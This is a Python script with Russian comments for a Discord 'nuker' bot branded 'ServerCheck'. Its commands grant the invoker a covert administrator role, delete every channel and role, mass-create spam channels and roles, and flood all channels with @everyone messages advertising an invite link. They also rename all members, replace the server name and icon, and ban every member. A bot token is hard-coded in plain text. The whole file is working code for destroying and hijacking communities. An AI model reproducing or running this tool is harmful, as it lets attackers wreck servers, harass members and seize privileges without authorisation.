import discord
from discord.ext import commands
from asyncio import sleep
from discord.utils import get

TOKEN = 'ODYyMjY0MTUyMDcxODY0MzYw.YOV0EQ.4MznexNA7z-1JclHyFmVnxHyv4Y'

bot = commands.Bot(command_prefix='!') # ! - префикс, на который будет реагировать наш бот

@bot.command(pass_context=True)  # разрешаем передавать агрументы
async def op(ctx):  # создаем асинхронную фунцию бота
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="Hack", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добавляем роль
    
    await ctx.message.delete()

@bot.command()
async def spamchannels(ctx):
    await ctx.message.delete()
    for i in range(40):
        await ctx.guild.create_text_channel(name=f'Crashed by ServerCheck')
        await ctx.guild.create_voice_channel(f"Crashed by ServerCheck")
        await ctx.guild.create_category(name='Crashed by ServerCheck')

@bot.command()
async def deleteroles(ctx):
    await ctx.message.delete()
    count = 0
    for channel in ctx.guild.roles:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    await ctx.author.send(f'Удалил {count} ролей')

@bot.command()
async def deletechannels(ctx):
    await ctx.message.delete()
    count = 0
    for channel in ctx.guild.voice_channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    for channel in ctx.guild.text_channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass
    await ctx.guild.create_text_channel('chat')
    await ctx.author.send(f'Удалил {count} каналов')

@bot.command()
async def spamroles(ctx):
    await ctx.message.delete()
    for i in range(40):
        await ctx.guild.create_role(name='Crashed by ServerCheck')

@bot.command()
async def attack(ctx):
    await ctx.message.delete()
    count = 0
    for channel in ctx.guild.voice_channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    for channel in ctx.guild.text_channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass
    await ctx.author.send(f'Удалено {count} каналов')
    count = 0
    for channel in ctx.guild.roles:
        try:
            await channel.delete(reason='Crash By ServerCheck')
            count+=1
        except:
            pass

    await ctx.author.send(f'Удалил {count} ролей')
    for i in range(50):
        await ctx.guild.create_text_channel(name=f'Crashed by ServerCheck')
        await ctx.guild.create_text_channel(name=f'Crashed by ServerCheck')
        await ctx.guild.create_text_channel(name=f'Crashed by ServerCheck')
        await ctx.guild.create_voice_channel(f"Crashed by ServerCheck")
        await ctx.guild.create_voice_channel(f"Crashed by ServerCheck")
        await ctx.guild.create_category(name='Crashed by ServerCheck')
        await ctx.guild.create_category(name='Crashed by ServerCheck')
        await ctx.guild.create_category(name='Crashed by ServerCheck')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!')
        await ctx.guild.create_voice_channel(f"Crashed by ServerCheck")

    for i in ctx.guild.members:
        try:
                await i.edit(nick=f"Crashed By ServerCheck")
        except:
            pass
    with open('icon.png', 'rb') as f:
        avatar = f.read()
        await ctx.guild.edit(name='Crash By ServerCheck', icon=avatar)
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')
    for channel in ctx.guild.text_channels:
            await channel.send('@everyone @here\nДанный сервер крашится ботом ServerCheck!\nСервер поддержки: https://discord.gg/DVFDdTezAP')

@bot.command()
async def ban(ctx):
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="По просьбе") #баним
        except:
            pass





bot.run('ODYyMjY0MTUyMDcxODY0MzYw.YOV0EQ.4MznexNA7z-1JclHyFmVnxHyv4Y') 